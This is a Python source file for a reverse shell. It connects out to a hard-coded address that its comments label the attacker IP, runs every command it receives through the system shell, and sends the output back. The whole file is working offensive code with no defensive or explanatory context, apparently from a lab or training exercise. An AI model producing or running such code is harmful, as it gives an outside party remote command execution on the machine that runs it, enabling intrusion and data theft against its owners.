import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket
    s.connect(('192.168.126.139', 8080))  # define the attacker IP and source port

    while True:  # keep receiving commands
        command = s.recv(1024).decode()  # read the first KB of the TCP socket
        if 'terminate' in command:  # close the connection if terminate
            s.close()
            break
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:].strip())
                s.sendall((os.getcwd() + "\n").encode())
            except Exception as e:
                s.sendall((str(e) + "\n").encode())
        else:
            try:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = CMD.communicate()
                response = stdout + stderr
                if not response:
                    response = b"Command executed\n"
                s.sendall(response)
            except Exception as e:
                s.sendall((str(e) + "\n").encode())

def main():
    connect()

if __name__ == '__main__':
    main()
